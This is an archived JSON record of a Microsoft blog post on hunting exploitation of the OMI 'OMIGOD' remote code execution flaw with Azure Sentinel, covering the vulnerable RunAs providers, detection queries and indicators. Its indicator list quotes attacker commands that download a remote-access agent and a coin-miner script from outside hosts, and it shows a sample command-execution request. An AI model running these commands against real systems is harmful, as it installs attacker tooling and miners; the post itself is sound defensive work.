{
    "id": "70126e7d-4199-4591-a072-0dc395affea3",
    "created_at": "2023-01-12T15:09:11.441805Z",
    "updated_at": "2025-03-27T02:06:03.182231Z",
    "deleted_at": null,
    "sha1_hash": "559fad25fda7c21ad2bfa5228b5460a7bf8def74",
    "title": "2021-09-18 - Hunting for OMI Vulnerability Exploitation with Azure Sentinel",
    "authors": "",
    "file_creation_date": "2022-05-28T15:49:30Z",
    "file_modification_date": "2022-05-28T15:49:30Z",
    "file_size": 826382,
    "plain_text": "# Hunting for OMI Vulnerability Exploitation with Azure Sentinel\n\n**techcommunity.microsoft.com/t5/azure-sentinel/hunting-for-omi-vulnerability-exploitation-with-azure-sentinel/ba-**\np/2764093\n\nSeptember 18, 2021\n\nSep 18 2021 03:57 PM\n\n_Russell McDonald, Roberto Rodriguez, and Ajeet Prakash_\n\n_Special thanks to: Ross Bevington_\n\nFollowing the September 14, 2021 release of three Elevation of Privilege (EoP)th\n[vulnerabilities (CVE-2021-38645,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38645) [CVE-2021-38649,](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38649) [CVE-2021-38648) and one](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38648)\n[unauthenticated Remote Code Execution (RCE) vulnerability (CVE-2021-38647) in the Open](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)\nManagement Infrastructure (OMI) Framework, analysts in the Microsoft Threat Intelligence\nCenter (MSTIC) have been monitoring for signs of exploitation and investigating detections\n[to further protect customers. Following the MSRC guidance to block ports that you aren't](https://msrc-blog.microsoft.com/2021/09/16/additional-guidance-regarding-omi-vulnerabilities-within-azure-vm-management-extensions/)\nusing and to ensure the OMI service is patched are great first steps. In this blog, we have\nsome things to share about current attacks in the wild, agents and software involved,\nindicators for defenders to look for on host machines, and to share new detections in Azure\nSentinel.\n\n## Attacks in the wild\n\nAt Microsoft we monitor for attacks against our cloud services to inform our future security\nresearch, track emerging threats, and to improve the detection coverage of our security\nofferings. As part of that work, MSTIC is monitoring for exploitation of the OMI related RCE\n(CVE-2021-38647). To date we have seen several active exploitation attempts ranging from\nbasic host enumeration (running uname, id, ps commands) to attempts to install a crypto\ncurrency miner or file share. (Details available below in Hunting cues section). We have also\nseen others in the community report similar behavior to include installs of the Mirai botnet.\n\n\n-----\n\nWhile many of the attackers are looking for port 5986, we are also seeing attacks on port\n1270. Due to the number of easily adaptable proof of concept exploits available and the\nvolume of reconnaissance-type attacks, we are anticipating an increase in the number of\neffects-type attacks (coin miners, bot installation, etc.).\n\n## What is OMI?\n\nOMI is an open-source project to further the development of a production quality\nimplementation of the OMI CIMOM is also designed to be portable and highly modular. In\norder to attain its small footprint, it is coded in C, which also makes it a much more viable\nCIM Object Manager for embedded systems and other infrastructure components that have\nmemory constraints for their management processor. OMI is also designed to be inherently\nportable. It builds and runs today on most UNIX® systems and Linux. In addition to OMI's\nsmall footprint, it also demonstrates very high performance.\n\n## Unauthenticated remote command execution?\n\nIn a nutshell, anyone with access to an endpoint running a vulnerable version (less than\n1.6.8.1) of the OMI agent can execute arbitrary commands over an HTTP request without an\nauthorization header. The expected behavior would be a 401 unauthorized response.\nHowever, the user is able to execute commands with root privileges.\n\n[More details are available in the MSRC CVE-2021-38647 post and the finder company Wiz](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)\nblog post.\n\n## Endpoint Execution Context\n\nIn addition to monitoring for incoming connections over ports 5986, 5985 or 1270 to\nvulnerable systems, there is more to explore at the endpoint level.\n\n## SCXCore Providers\n\nSCXcore, started as the [Microsoft Operations Manager UNIX/Linux Agent, is now used in a](https://nam06.safelinks.protection.outlook.com/?url=https%3A%2F%2Ftechnet.microsoft.com%2Flibrary%2Fhh205987.aspx&data=04%7C01%7Crussmc%40microsoft.com%7Ce5ae650976294cb04c1908d979eb7263%7C72f988bf86f141af91ab2d7cd011db47%7C1%7C0%7C637674874445994559%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C1000&sdata=vG4wRzlqc8aj6eyNuPX45tafQwyRYqLylHG%2FfWfFsSI%3D&reserved=0)\n[host of products including Microsoft Operations Manager.](https://nam06.safelinks.protection.outlook.com/?url=https%3A%2F%2Ftechnet.microsoft.com%2Flibrary%2Fhh205987.aspx&data=04%7C01%7Crussmc%40microsoft.com%7Ce5ae650976294cb04c1908d979eb7263%7C72f988bf86f141af91ab2d7cd011db47%7C1%7C0%7C637674874445994559%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C1000&sdata=vG4wRzlqc8aj6eyNuPX45tafQwyRYqLylHG%2FfWfFsSI%3D&reserved=0) [Microsoft Azure, and](https://nam06.safelinks.protection.outlook.com/?url=https%3A%2F%2Fazure.microsoft.com%2F&data=04%7C01%7Crussmc%40microsoft.com%7Ce5ae650976294cb04c1908d979eb7263%7C72f988bf86f141af91ab2d7cd011db47%7C1%7C0%7C637674874446004552%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C1000&sdata=ntBD2LhSHMr7Os80vWt6jrWIv2DArrpGhFmlWQNZEqY%3D&reserved=0) Microsoft\nOperations Management Suite.\n\n[The SCXcore provides a CIMOM provider, based on OMI, to return logging and statistical](https://nam06.safelinks.protection.outlook.com/?url=https%3A%2F%2Fgithub.com%2FMicrosoft%2Fomi&data=04%7C01%7Crussmc%40microsoft.com%7Ce5ae650976294cb04c1908d979eb7263%7C72f988bf86f141af91ab2d7cd011db47%7C1%7C0%7C637674874446014554%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C1000&sdata=94v5LZiA7jA5EJ64NW871Kn1wWrNYh7bIwZt21qgvUo%3D&reserved=0)\ninformation for a UNIX or Linux system. There are several providers or classes available\nthrough the SCXcore provider which can be used to gather information from an endpoint\nsuch as MemoryStatisticalInformation or FileSystemStatisticalInformation.\n\nIn addition, there is one support provider named the RunAsProvider which provides the\nfollowing classes:\n\n\n-----\n\nExecuteCommand: Executes any UNIX/Linux native command\nExecuteShellCommand: Executes any UNIX/Linux command using the /bin/sh shell\nExecuteScript: Executes any UNIX/Linux script using the /bin/sh shell\n\n## Executing Code via ExecuteShellCommand\n\n**Based on the initial research from Wiz, the following command was used to explore**\nnetwork traffic in order to craft an HTTP request to test the vulnerability:\n\n/opt/omi/bin/omicli --hostname 192.168.1.1 -u azureuser -p Password1 iv root/scx {\nSCX_OperatingSystem } ExecuteShellCommand { command 'id' timeout 0 }\n\n**During testing, we used the** [Scxadmin tool, available as part of SCX, to increase all logging](https://docs.microsoft.com/en-us/system-center/scom/manage-security-administer-crossplat-agent?view=sc-om-2019#scxadmin)\nto VERBOSE and identify additional sources of data. The following command was used:\n\n/opt/microsoft/scx/bin/tools/scxadmin -log-set all verbose\n\n**After running public proof-of-concepts to test the vulnerability, we validated that the code**\nwas being handled by the RunAsProvider :: Invoke_ExecuteShellCommand class:\n\n**Checking logs from auditd via Syslog, we also identified where the code was being**\nexecuted from:\n\n**We tested the same in our lab environments, and we observed the same behavior which is**\nshown below:\n\n\n-----\n\n**Looking at the code behind the components of the RunAs providers, there are some**\nreferences to it:\n\n**More information about SCXcore is available here: GitHub - microsoft/SCXcore: System**\nCenter Cross Platform Provider for Operations Manager\n\n## Executing Code via ExecuteScript\n\nSimilarly, scripts can be run using the ExecuteScript provider. In this case, the body of the\nhttp request contains a reference to ExecuteScript. In the below example, the command ‘id’\nis base64 encoded to ‘aWQ=’:\n\n\n-----\n\nIn this case, the script is passed into a temp directory which you can see in the execve logs.\nLook for a commandline similar to /bin/sh /etc/opt/microsoft/scx/conf/tmpdir/scx*. This\ncommand will still show as being run from the same /var/opt/microsoft/scx/tmp current\nworking directory.\n\nOf note, this is the method we have seen used with attackers attempting to install coin\nminers.\n\nAzure Sentinel coverage\n\nRelevant security data required for understanding the impact of an attack is produced in\nmultiple locations. Azure Sentinel has made it easy to collect the data from multiple data\nsources easily. This section of the post contains guidance and generic approaches to look for\nthe OMI related activity in various data feeds that are available by default in Azure Sentinel\nor can be onboarded to Azure Sentinel.\n\nSome Azure products, such as Configuration Management, open an HTTP/S port\n(1270/5985/5986) listening for OMI. Attackers can exploit the vulnerability in OMI where\nthese ports are open by sending a specially crafted message via HTTPS to port listening to\nOMI to gain initial access to the machine.\n\nThe Azure Sentinel query linked below tries to identify connection attempts from the external\nIP addresses to the OMI management ports (5985,5986,1270). The query primarily\nleverages the Network Session normalization schema (imNetworkSession) as well as a few\nother logs to look for this network connection activity from an external IP address. Where\navailable, it tries to restrict the results to the relevant OMI process. The results can\nsometimes be noisy; hence the query has been shipped as a hunting query.\n\nNormalizing parsers for leveraging the imNetworkSession normalized schema are required\n[for this query to work and can be deployed in a click using an ARM Template.](https://github.com/Azure/Azure-Sentinel/tree/master/Parsers/ASimNetworkSession)\n\nAzure-Sentinel/NetworkConnectiontoOMIPorts.yaml at master · Azure/Azure-Sentinel ·\nGitHub\n\nCustomers can also use Heartbeat logs that monitors agent health to find vulnerable\nmachine. The Azure Sentinel query linked below tries to leverage Heartbeat data to find\nOMS-agents that are reporting to the Azure Sentinel workspace but are not updated to the\nlatest version that prevents this vulnerability.\n\n[updated Sept 27, 2021]\n\nAzure-Sentinel/OMI_vulnerability_detection.yaml at master · Azure/Azure-Sentinel\n(github.com)\n\n\n-----\n\nAdditionally, Azure Security Center generates detailed security recommendations if there are\nvulnerable machines in an Azure Environment with OMI installed. With the continuous export\nfeature of Security Center, these security recommendations can be imported into Azure\nSentinel. Azure Sentinel leverages this data populated in Security Nested Recommendations\ntable to build a detection query to show vulnerable machines.\n\nAzure-Sentinel/OMIGODVulnerableMachines.yaml at master · Azure/Azure-Sentinel ·\nGitHub\n\nAzure Service Health has also sent notifications to potentially impacted customers. In the\nimpacted environments where customers can run a quick query to check if they are impacted\nby this Vulnerability.\n\n_AzureActivity_\n_| where CategoryValue == 'ServiceHealth'_\n_| where isnotempty(Properties) and Properties has 'CVE-2021-38645'_\n_| extend defaultLanguageTitle =_\n_tostring(parse_json(tostring(parse_json(Properties).eventProperties)).defaultLanguageTitle)_\n\n## SCX RunAs Provider\n\n[updated Sept 24, 2021]\n\nThe below hunting query uses security events from the Microsoft Audit Collection Tool\n[(AUOMS) collected via the Azure Sentinel Syslog data connector to explore the use of SCX](https://docs.microsoft.com/en-us/azure/sentinel/connect-syslog)\nExecute RunAs providers.\n\nAzure-Sentinel/SCXExecuteRunAsProviders.yml at master · Azure/Azure-Sentinel\n(github.com)\n\nExecute RunAs providers such as the ExecuteShellCommand and ExecuteScript can be\nused to execute any UNIX/Linux command and script respectively using the /bin/sh shell.\nExecution occurs from the /var/opt/microsoft/scx/tmp directory and depending on the\nexecution RunAs provider, execution can be a command or a script. If the ExecuteScript\nRunAs provider is used, then the script file is created in the following directory /bin/sh\n/etc/opt/microsoft/scx/conf/tmpdir/ with the prefix scx (e.g. scxzOy96). SCXcore, started as\nthe Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products\nincluding Microsoft Operations Manager. Microsoft Azure, and Microsoft Operations\nManagement Suite.\n\nHunting cues and IOCs\n\n\n-----\n\nCommon enumeration\ncommands seen\n\n\nuname -a, id, netstat, ps\n\n\nExploitation attempt wget\nhxxps://www.dwservice.net/download/dwagent_generic.sh -O\ndwagent_generic.sh\n\nExploitation attempt echo curl\nhxxps://www.dwservice.net/download/dwagent_generic.sh -output dw.sh > go.sh\n\nExploitation attempt curl -fSsL hxxp://104.168.213.31:55879/coinlinux/runMiner.sh\n\nScanning IPs 13.212.235.12\n\nScanning IPs 142.93.148.12\n\nScanning IPs 171.224.80.216\n\nScanning IPs 185.220.100.245\n\nScanning IPs 216.151.191.152\n\nScanning IPs 23.129.64.140\n\nScanning IPs 31.44.185.115\n\nScanning IPs 46.30.42.126\n\nScanning IPs 5.45.127.209\n\nScanning IPs 94.198.42.158\n\nReferences:\n\n**MSRC communications:**\n\nCVE-2021-38647 - Security Update Guide - Microsoft - Open Management\nInfrastructure Remote Code Exec...\n\n\n-----\n\nAdditional Guidance Regarding OMI Vulnerabilities within Azure VM Management\nExtensions – Microsoft ...\n\n**Azure Security Center Guidance:**\n\nUsing ASC to find machines affected by OMI vulnerabilities in Azure VM Management\nExtensions - Micro...\n\n**Sentinel Detections:**\n\n**Software and tools:**\n\n### Research lab environments:\n\nAzure-Sentinel2Go/grocery-list/Linux/demos/CVE-2021-38647-OMI at master ·\nOTRF/Azure-Sentinel2Go (gi...\n\n**Public Discussion About Attacks in the wild:**\n\nchris doman on Twitter: \":loudspeaker:OMIGOD (CVE-2021-38647) is now under active\nexploitation :loud...\nAndrew Morris on Twitter: \"The Azure \"OHMIGOD\" vulnerability (CVE-2021-38647) is\nincreasing a good b...\nKevin Beaumont on Twitter: \"Oh Mirai fixed their binary, it now supports proper\nOMIGOD exploitation....\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-18 - Hunting for OMI Vulnerability Exploitation with Azure Sentinel.pdf"
    ],
    "report_names": [
        "2021-09-18 - Hunting for OMI Vulnerability Exploitation with Azure Sentinel.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536151,
    "ts_updated_at": 1743041163,
    "ts_creation_date": 1653752970,
    "ts_modification_date": 1653752970,
    "files": {
        "pdf": "https://archive.orkl.eu/559fad25fda7c21ad2bfa5228b5460a7bf8def74.pdf",
        "text": "https://archive.orkl.eu/559fad25fda7c21ad2bfa5228b5460a7bf8def74.txt",
        "img": "https://archive.orkl.eu/559fad25fda7c21ad2bfa5228b5460a7bf8def74.jpg"
    }
}